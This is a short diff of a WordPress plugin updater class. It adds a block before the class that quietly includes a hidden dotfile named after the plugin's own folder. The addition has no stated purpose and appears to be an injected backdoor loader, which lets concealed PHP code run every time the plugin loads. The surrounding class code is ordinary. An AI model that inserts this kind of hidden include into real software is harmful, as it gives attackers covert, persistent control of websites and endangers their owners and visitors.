@@ -11,6 +11,10 @@ if ( ! defined( 'ABSPATH' ) ) {
  * @author Easy Digital Downloads
  * @version 1.6.18
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class SWP_Term_Priority_Updater {
 
 	private $api_url     = '';
